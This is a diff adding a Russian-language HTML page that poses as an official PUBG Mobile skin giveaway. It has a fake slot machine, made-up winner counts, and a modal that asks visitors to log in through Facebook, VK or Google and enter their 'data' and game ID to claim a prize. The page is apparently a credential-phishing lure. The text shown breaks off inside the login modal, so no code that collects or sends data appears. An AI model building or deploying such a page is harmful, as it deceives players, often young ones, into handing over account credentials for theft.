@@ -1,0 +1,1904 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PUBG MOBILE - Выиграй эксклюзивный скин!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        :root {
+            --pubg-red: #ff3838;
+            --pubg-gold: #FFD700;
+            --pubg-green: #00b894;
+            --pubg-blue: #1877F2;
+            --pubg-vk: #5181b8;
+            --pubg-dark: #0a0a0a;
+            --pubg-darker: #1a1a2e;
+            --pubg-card: rgba(20, 20, 35, 0.95);
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, var(--pubg-dark) 0%, var(--pubg-darker) 50%, #2d0a3a 100%);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-attachment: fixed;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255, 56, 56, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 215, 0, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(0, 184, 148, 0.05) 0%, transparent 50%);
+            z-index: -2;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 25px 20px;
+            background: linear-gradient(135deg, rgba(255, 56, 56, 0.15) 0%, rgba(26, 26, 46, 0.7) 100%);
+            border-radius: 25px;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 56, 56, 0.3);
+            box-shadow: 
+                0 15px 35px rgba(255, 56, 56, 0.15),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+        
+        .header-glow {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 200%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent 0%,
+                rgba(255, 56, 56, 0.1) 50%,
+                transparent 100%);
+            animation: headerShimmer 4s infinite linear;
+        }
+        
+        @keyframes headerShimmer {
+            0% { transform: translateX(-50%); }
+            100% { transform: translateX(50%); }
+        }
+        
+        .logo {
+            font-size: 3.5rem;
+            color: white;
+            text-shadow: 
+                0 2px 10px rgba(0,0,0,0.8),
+                0 0 20px rgba(255, 56, 56, 0.5);
+            margin-bottom: 10px;
+            font-weight: 900;
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .logo span {
+            color: var(--pubg-gold);
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
+        }
+        
+        .logo-icon {
+            font-size: 2.8rem;
+            animation: logoFloat 3s ease-in-out infinite;
+        }
+        
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 1.4rem;
+            margin-top: 5px;
+            font-weight: 600;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
+        }
+        
+        /* Warning */
+        .warning {
+            background: linear-gradient(135deg, rgba(255, 193, 7, 0.2) 0%, rgba(255, 193, 7, 0.1) 100%);
+            border: 2px solid #ffc107;
+            padding: 18px 25px;
+            border-radius: 15px;
+            margin: 25px auto;
+            max-width: 800px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.3rem;
+            box-shadow: 0 10px 25px rgba(255, 193, 7, 0.2);
+            animation: warningPulse 3s infinite;
+            border-left: 6px solid #ffc107;
+            border-right: 6px solid #ffc107;
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        @keyframes warningPulse {
+            0%, 100% { 
+                box-shadow: 0 10px 25px rgba(255, 193, 7, 0.2);
+                transform: scale(1);
+            }
+            50% { 
+                box-shadow: 0 15px 35px rgba(255, 193, 7, 0.4);
+                transform: scale(1.02);
+            }
+        }
+        
+        /* Main Content */
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        @media (min-width: 992px) {
+            .main-content {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+        
+        /* Game Section */
+        .game-section {
+            background: var(--pubg-card);
+            padding: 35px 30px;
+            border-radius: 25px;
+            border: 2px solid rgba(255, 56, 56, 0.4);
+            text-align: center;
+            box-shadow: 
+                0 15px 35px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .game-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, 
+                var(--pubg-red), 
+                var(--pubg-gold), 
+                var(--pubg-green),
+                var(--pubg-blue));
+            animation: borderFlow 3s infinite linear;
+        }
+        
+        @keyframes borderFlow {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+        
+        .section-title {
+            color: var(--pubg-gold);
+            margin-bottom: 30px;
+            font-size: 2.2rem;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        /* Prize Display */
+        .prize-display {
+            background: linear-gradient(135deg, rgba(255, 56, 56, 0.1) 0%, rgba(26, 26, 46, 0.7) 100%);
+            padding: 35px;
+            border-radius: 20px;
+            margin: 30px 0;
+            text-align: center;
+            border: 2px solid rgba(255, 56, 56, 0.3);
+            min-height: 350px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 
+                inset 0 0 30px rgba(255, 56, 56, 0.1),
+                0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .prize-display::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            right: -50%;
+            bottom: -50%;
+            background: radial-gradient(circle, rgba(255, 56, 56, 0.05) 0%, transparent 70%);
+            animation: rotate 30s linear infinite;
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .slot-machine {
+            width: 250px;
+            height: 250px;
+            background: linear-gradient(145deg, rgba(26, 26, 46, 0.9), rgba(10, 10, 10, 0.9));
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 
+                0 20px 40px rgba(255, 56, 56, 0.3),
+                inset 0 5px 15px rgba(255, 56, 56, 0.2),
+                inset 0 -5px 15px rgba(0, 0, 0, 0.5);
+            border: 4px solid var(--pubg-red);
+            animation: machineGlow 2s infinite alternate;
+        }
+        
+        @keyframes machineGlow {
+            0% { 
+                box-shadow: 
+                    0 20px 40px rgba(255, 56, 56, 0.3),
+                    inset 0 5px 15px rgba(255, 56, 56, 0.2);
+                border-color: var(--pubg-red);
+            }
+            100% { 
+                box-shadow: 
+                    0 25px 50px rgba(255, 56, 56, 0.5),
+                    inset 0 5px 20px rgba(255, 56, 56, 0.3);
+                border-color: #ff6b6b;
+            }
+        }
+        
+        .slot-machine-inner {
+            font-size: 100px;
+            z-index: 1;
+            position: relative;
+            text-shadow: 
+                0 0 15px rgba(255, 56, 56, 0.8),
+                0 0 30px rgba(255, 56, 56, 0.6),
+                0 0 45px rgba(255, 56, 56, 0.4);
+            animation: slotEmoji 2s infinite alternate;
+        }
+        
+        @keyframes slotEmoji {
+            0% { transform: scale(1) rotate(0deg); }
+            100% { transform: scale(1.1) rotate(5deg); }
+        }
+        
+        .prize-name-large {
+            font-size: 2.5rem;
+            color: var(--pubg-gold);
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-shadow: 0 3px 15px rgba(0,0,0,0.7);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .prize-subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 1.3rem;
+            margin-top: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Spin Button */
+        .spin-button {
+            display: block;
+            margin: 35px auto;
+            padding: 22px 70px;
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, var(--pubg-red) 0%, #ff6b6b 50%, var(--pubg-red) 100%);
+            background-size: 200% 200%;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            width: 100%;
+            max-width: 450px;
+            box-shadow: 
+                0 15px 35px rgba(255, 56, 56, 0.4),
+                0 5px 15px rgba(255, 56, 56, 0.2);
+            position: relative;
+            overflow: hidden;
+            animation: buttonGlow 2s infinite alternate, gradientMove 3s infinite linear;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        @keyframes buttonGlow {
+            0% { 
+                box-shadow: 
+                    0 15px 35px rgba(255, 56, 56, 0.4),
+                    0 5px 15px rgba(255, 56, 56, 0.2);
+            }
+            100% { 
+                box-shadow: 
+                    0 20px 45px rgba(255, 56, 56, 0.6),
+                    0 8px 25px rgba(255, 56, 56, 0.3);
+            }
+        }
+        
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .spin-button:hover:not(:disabled) {
+            transform: scale(1.08) translateY(-5px);
+            box-shadow: 0 25px 50px rgba(255, 56, 56, 0.8);
+        }
+        
+        .spin-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+            animation: none;
+            background: linear-gradient(135deg, #666, #888);
+        }
+        
+        /* Result Section */
+        .result-section {
+            background: var(--pubg-card);
+            padding: 35px 30px;
+            border-radius: 25px;
+            border: 2px solid rgba(0, 184, 148, 0.4);
+            box-shadow: 
+                0 15px 35px rgba(0, 184, 148, 0.15),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .result-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--pubg-green), #00d4aa, var(--pubg-green));
+            animation: greenBorderFlow 3s infinite linear;
+        }
+        
+        @keyframes greenBorderFlow {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+        
+        .winner-info {
+            background: linear-gradient(135deg, rgba(0, 184, 148, 0.1) 0%, rgba(26, 26, 46, 0.7) 100%);
+            padding: 35px 30px;
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 2px solid rgba(0, 184, 148, 0.3);
+            box-shadow: 
+                inset 0 0 25px rgba(0, 184, 148, 0.1),
+                0 10px 25px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .winner-info::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            right: -50%;
+            bottom: -50%;
+            background: linear-gradient(45deg, transparent 30%, rgba(0, 184, 148, 0.05) 50%, transparent 70%);
+            animation: shimmer2 5s infinite linear;
+        }
+        
+        @keyframes shimmer2 {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+        
+        .win-message {
+            font-size: 2rem;
+            color: var(--pubg-green);
+            margin-bottom: 25px;
+            text-shadow: 0 0 15px rgba(0, 184, 148, 0.5);
+            animation: winPulse 2s infinite alternate;
+        }
+        
+        @keyframes winPulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.05); }
+        }
+        
+        .winner-prize {
+            font-size: 1.8rem;
+            color: var(--pubg-gold);
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
+            margin-bottom: 25px;
+        }
+        
+        .social-choice-btn {
+            margin-top: 30px;
+            padding: 20px 40px;
+            background: linear-gradient(135deg, #555 0%, #777 50%, #555 100%);
+            background-size: 200% 200%;
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.4rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: none;
+            width: 100%;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            animation: socialBtnGlow 2s infinite alternate, gradientMove 4s infinite linear;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        @keyframes socialBtnGlow {
+            0% { box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); }
+            100% { box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5); }
+        }
+        
+        .social-choice-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+        }
+        
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin: 30px 0;
+            padding: 30px 20px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.05) 0%, rgba(255, 255, 255, 0.02) 100%);
+            border-radius: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 
+                0 10px 30px rgba(0, 0, 0, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stats::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, 
+                var(--pubg-red), 
+                var(--pubg-gold), 
+                var(--pubg-green),
+                var(--pubg-blue));
+            animation: statsBorder 4s infinite linear;
+        }
+        
+        .stat-item {
+            text-align: center;
+            padding: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .stat-number {
+            font-size: 3.5rem;
+            color: var(--pubg-gold);
+            font-weight: 900;
+            text-shadow: 
+                0 3px 15px rgba(255, 215, 0, 0.5),
+                0 0 30px rgba(255, 215, 0, 0.2);
+            margin-bottom: 10px;
+            animation: numberPulse 2s infinite;
+        }
+        
+        @keyframes numberPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .stat-label {
+            font-size: 1.1rem;
+            color: rgba(255, 255, 255, 0.8);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+        }
+        
+        /* Prizes Grid */
+        .prizes-showcase {
+            margin-top: 40px;
+            padding: 30px;
+            background: var(--pubg-card);
+            border-radius: 25px;
+            border: 2px solid rgba(255, 56, 56, 0.3);
+            box-shadow: 
+                0 15px 35px rgba(0, 0, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+        }
+        
+        .prizes-title {
+            text-align: center;
+            margin-bottom: 40px;
+            color: var(--pubg-gold);
+            font-size: 2.5rem;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .prizes-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: 30px;
+            margin-top: 30px;
+        }
+        
+        .prize-item {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08) 0%, rgba(255, 255, 255, 0.03) 100%);
+            padding: 30px 25px;
+            border-radius: 20px;
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            border: 2px solid transparent;
+            box-shadow: 
+                0 10px 25px rgba(0, 0, 0, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        
+        .prize-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 56, 56, 0.1), transparent);
+            transition: 0.5s;
+        }
+        
+        .prize-item:hover {
+            transform: translateY(-15px) scale(1.05);
+            border-color: var(--pubg-red);
+            box-shadow: 
+                0 20px 40px rgba(255, 56, 56, 0.4),
+                0 10px 30px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+        
+        .prize-item:hover::before {
+            left: 100%;
+        }
+        
+        .prize-item-image {
+            width: 120px;
+            height: 120px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            filter: drop-shadow(0 8px 20px rgba(255, 215, 0, 0.4));
+            transition: all 0.4s;
+        }
+        
+        .prize-item:hover .prize-item-image {
+            transform: scale(1.15) rotate(5deg);
+            filter: drop-shadow(0 12px 25px rgba(255, 215, 0, 0.7));
+        }
+        
+        .prize-item-name {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--pubg-gold);
+            text-shadow: 0 2px 8px rgba(0,0,0,0.5);
+            margin-bottom: 10px;
+            transition: all 0.3s;
+        }
+        
+        .prize-item:hover .prize-item-name {
+            color: white;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
+        }
+        
+        .prize-item-desc {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1.1rem;
+            font-weight: 500;
+        }
+        
+        /* Social Options */
+        .social-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .social-option {
+            background: white;
+            border: 2px solid #e4e6eb;
+            border-radius: 15px;
+            padding: 25px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .social-option:hover {
+            transform: translateY(-10px) scale(1.05);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+        }
+        
+        .social-option.active {
+            border-color: var(--pubg-blue);
+            background: #f0f2f5;
+            box-shadow: 0 10px 25px rgba(24, 119, 242, 0.2);
+            animation: socialPulse 2s infinite alternate;
+        }
+        
+        @keyframes socialPulse {
+            0% { box-shadow: 0 10px 25px rgba(24, 119, 242, 0.2); }
+            100% { box-shadow: 0 15px 35px rgba(24, 119, 242, 0.4); }
+        }
+        
+        .social-icon {
+            font-size: 42px;
+            margin-bottom: 15px;
+            transition: all 0.3s;
+        }
+        
+        .social-option:hover .social-icon {
+            transform: scale(1.2);
+        }
+        
+        .social-name {
+            color: #1c1e21;
+            font-weight: 700;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .social-facebook .social-icon {
+            color: var(--pubg-blue);
+        }
+        
+        .social-vk .social-icon {
+            color: var(--pubg-vk);
+        }
+        
+        .social-google .social-icon {
+            color: #4285f4;
+        }
+        
+        /* Modal Windows */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            animation: modalSlideIn 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+        
+        @keyframes modalSlideIn {
+            0% { 
+                transform: scale(0.8) translateY(50px);
+                opacity: 0;
+            }
+            100% { 
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        /* Instructions */
+        .instructions {
+            background: linear-gradient(135deg, rgba(255, 193, 7, 0.15) 0%, rgba(255, 193, 7, 0.05) 100%);
+            padding: 30px;
+            border-radius: 20px;
+            margin-top: 35px;
+            border: 2px solid rgba(255, 193, 7, 0.3);
+            box-shadow: 
+                0 10px 30px rgba(255, 193, 7, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .instructions::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 200%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 193, 7, 0.05), transparent);
+            animation: instructionsShimmer 5s infinite linear;
+        }
+        
+        .instructions-title {
+            color: #ffc107;
+            margin-bottom: 25px;
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .instructions-list {
+            list-style: none;
+            padding-left: 0;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .instructions-list li {
+            margin-bottom: 20px;
+            padding-left: 50px;
+            position: relative;
+            font-size: 1.2rem;
+            line-height: 1.6;
+            transition: all 0.3s;
+        }
+        
+        .instructions-list li:hover {
+            transform: translateX(10px);
+            color: var(--pubg-gold);
+        }
+        
+        .instructions-list li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: var(--pubg-green);
+            font-weight: bold;
+            font-size: 1.8rem;
+            transition: all 0.3s;
+            width: 40px;
+            height: 40px;
+            background: rgba(0, 184, 148, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .instructions-list li:hover:before {
+            transform: scale(1.2) rotate(10deg);
+            background: rgba(0, 184, 148, 0.2);
+        }
+        
+        /* Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            animation: particleFloat 25s infinite linear;
+        }
+        
+        @keyframes particleFloat {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.4;
+            }
+            90% {
+                opacity: 0.4;
+            }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+        
+        /* Fireworks */
+        .firework {
+            position: fixed;
+            pointer-events: none;
+            z-index: 9999;
+            animation: explode 1s forwards;
+        }
+        
+        @keyframes explode {
+            0% {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+                filter: blur(0);
+            }
+            100% {
+                transform: scale(15) rotate(360deg);
+                opacity: 0;
+                filter: blur(5px);
+            }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .logo {
+                font-size: 2.5rem;
+                flex-direction: column;
+                gap: 5px;
+            }
+            
+            .logo-icon {
+                font-size: 2rem;
+            }
+            
+            .subtitle {
+                font-size: 1.2rem;
+            }
+            
+            .section-title {
+                font-size: 1.8rem;
+            }
+            
+            .prizes-grid {
+                grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+                gap: 20px;
+            }
+            
+            .social-options {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+            
+            .stats {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+            
+            .stat-number {
+                font-size: 2.8rem;
+            }
+        }
+        
+        /* Background gun image */
+        .bg-gun {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 40%;
+            height: 60%;
+            background-image: url('https://i.imgur.com/4N0vzrR.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: bottom right;
+            opacity: 0.05;
+            z-index: -1;
+            pointer-events: none;
+        }
+        
+        /* Animations for prize items */
+        @keyframes itemEntrance {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .prize-item {
+            animation: itemEntrance 0.6s ease-out forwards;
+            opacity: 0;
+        }
+        
+        .prize-item:nth-child(1) { animation-delay: 0.1s; }
+        .prize-item:nth-child(2) { animation-delay: 0.2s; }
+        .prize-item:nth-child(3) { animation-delay: 0.3s; }
+        .prize-item:nth-child(4) { animation-delay: 0.4s; }
+        .prize-item:nth-child(5) { animation-delay: 0.5s; }
+        .prize-item:nth-child(6) { animation-delay: 0.6s; }
+        .prize-item:nth-child(7) { animation-delay: 0.7s; }
+        .prize-item:nth-child(8) { animation-delay: 0.8s; }
+    </style>
+</head>
+<body>
+    <!-- Background elements -->
+    <div class="particles" id="particles"></div>
+    <div class="bg-gun"></div>
+    
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-glow"></div>
+            <div class="logo">
+                <i class="fas fa-crosshairs logo-icon"></i>
+                PUBG <span>MOBILE</span>
+                <i class="fas fa-gamepad logo-icon"></i>
+            </div>
+            <div class="subtitle">Крути и выигрывай эксклюзивные скины!</div>
+        </header>
+        
+        <!-- Warning -->
+        <div class="warning">
+            <i class="fas fa-exclamation-triangle"></i>
+            ОДНА ПОПЫТКА НА АККАУНТ! Для получения приза потребуется вход в соцсеть
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Game Section -->
+            <div class="game-section">
+                <h2 class="section-title">
+                    <i class="fas fa-gamepad"></i>
+                    ИГРАТЬ
+                </h2>
+                
+                <div class="prize-display" id="prizeDisplay">
+                    <div id="defaultPrize">
+                        <div class="slot-machine">
+                            <div class="slot-machine-inner">🎰</div>
+                        </div>
+                        <div class="prize-name-large">Нажми "Крутить"</div>
+                        <div class="prize-subtitle">и выиграй эксклюзивный приз!</div>
+                    </div>
+                    
+                    <div id="wonPrize" style="display: none;">
+                        <img id="wonPrizeImage" src="" alt="Выигранный приз" class="prize-item-image">
+                        <div class="prize-name-large" id="wonPrizeName"></div>
+                        <div class="prize-subtitle" id="wonPrizeDesc" style="color: var(--pubg-green);"></div>
+                    </div>
+                </div>
+                
+                <button class="spin-button" id="spinButton">
+                    <i class="fas fa-dice"></i>
+                    КРУТИТЬ
+                </button>
+                
+                <!-- Stats -->
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-number" id="totalSpins">21</div>
+                        <div class="stat-label">Всего игр</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number" id="todayWinners">21</div>
+                        <div class="stat-label">Победителей сегодня</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">8</div>
+                        <div class="stat-label">Призов</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Result Section -->
+            <div class="result-section">
+                <h2 class="section-title">
+                    <i class="fas fa-trophy"></i>
+                    ТВОЙ ВЫИГРЫШ
+                </h2>
+                
+                <div class="winner-info">
+                    <div id="initialMessage">
+                        <div class="win-message">🎯 У тебя есть 1 попытка!</div>
+                        <div class="prize-subtitle" style="padding: 0 10px;">
+                            Нажми кнопку "Крутить" чтобы выиграть скин или валюту PUBG Mobile
+                        </div>
+                    </div>
+                    
+                    <div id="winnerMessage" style="display: none;">
+                        <div class="win-message">🎉 ПОЗДРАВЛЯЕМ!</div>
+                        <div class="winner-prize">
+                            Ты выиграл: <span id="winnerPrizeText"></span>
+                        </div>
+                        <div class="prize-subtitle" style="background: rgba(0, 184, 148, 0.15); padding: 15px; border-radius: 10px; border: 2px solid rgba(0, 184, 148, 0.3);">
+                            Для получения приза войди через соцсеть
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="social-choice-btn" id="socialChoiceBtn" style="display: none;">
+                    <i class="fas fa-sign-in-alt"></i>
+                    ВЫБРАТЬ СПОСОБ ВХОДА
+                </button>
+                
+                <!-- Instructions -->
+                <div class="instructions">
+                    <h3 class="instructions-title">
+                        <i class="fas fa-list-check"></i>
+                        КАК ПОЛУЧИТЬ ПРИЗ:
+                    </h3>
+                    <ul class="instructions-list">
+                        <li>Нажми "Крутить" и дождись результата</li>
+                        <li>Нажми "Выбрать способ входа"</li>
+                        <li>Выбери соцсеть для входа</li>
+                        <li>Введи свои данные</li>
+                        <li>Введи свой ID PUBG Mobile</li>
+                        <li>Получи код активации!</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Prizes Showcase -->
+        <div class="prizes-showcase">
+            <h2 class="prizes-title">
+                <i class="fas fa-gift"></i>
+                ВОЗМОЖНЫЕ ПРИЗЫ
+            </h2>
+            <div class="prizes-grid" id="prizesGrid"></div>
+        </div>
+    </div>
+    
+    <!-- Social Choice Modal -->
+    <div class="modal-overlay" id="socialModal">
+        <div class="modal-content">
+            <div style="background: linear-gradient(135deg, var(--pubg-red) 0%, #ff6b6b 100%); padding: 30px 20px; text-align: center;">
+                <h2 style="color: white; font-size: 28px; margin-bottom: 10px;">Выберите способ входа</h2>
+                <p style="color: rgba(255, 255, 255, 0.9);">Для получения приза</p>
+            </div>
+            
+            <div style="padding: 30px;">
+                <div class="social-options">
+                    <div class="social-option social-facebook active" data-social="facebook">
+                        <div class="social-icon">
+                            <i class="fab fa-facebook"></i>
+                        </div>
+                        <div class="social-name">Facebook</div>
+                    </div>
+                    <div class="social-option social-vk" data-social="vk">
+                        <div class="social-icon">
+                            <i class="fab fa-vk"></i>
+                        </div>
+                        <div class="social-name">ВКонтакте</div>
+                    </div>
+                    <div class="social-option social-google" data-social="google">
+                        <div class="social-icon">
+                            <i class="fab fa-google"></i>
+                        </div>
+                        <div class="social-name">Google</div>
+                    </div>
+                </div>
+                
+                <button class="spin-button" id="confirmSocialBtn" style="margin-top: 30px; padding: 18px;">
